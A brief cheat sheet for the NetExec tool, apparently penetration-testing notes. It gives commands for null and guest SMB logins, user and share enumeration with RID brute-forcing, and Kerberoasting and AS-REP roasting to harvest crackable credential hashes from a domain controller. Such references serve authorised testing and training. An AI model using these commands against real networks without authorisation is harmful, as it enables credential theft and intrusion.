Netexec is a powerful tool often used for exploitation in Active Directory Environments, though it can broadly be used against most windows targets.

## Installation
```bash
sudo apt install pipx git  
pipx ensurepath  
pipx install git+https://github.com/Pennyw0rth/NetExec
```
## Testing Authentication

```bash
# Guest Login
netexec smb target -u 'guest' -p ''

# Null Login
netexec smb target -u '' -p ''

# Local Authentication
netexec smb target -u username -p password --local-auth
```

## SMB
NetExec can be used to enumerate and exploit SMB.
```bash
# List Shares
netexec smb target -u '' -p '' --shares  

# Enumerate Information
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

# Kerberoast, target must be DC
netexec ldap target -u username -p password --kerberoasting hash.txt  

# ASREP-Roast, target must be DC
netexec ldap target -u username -p password --asreproast hash.txt
```

## Resources
https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/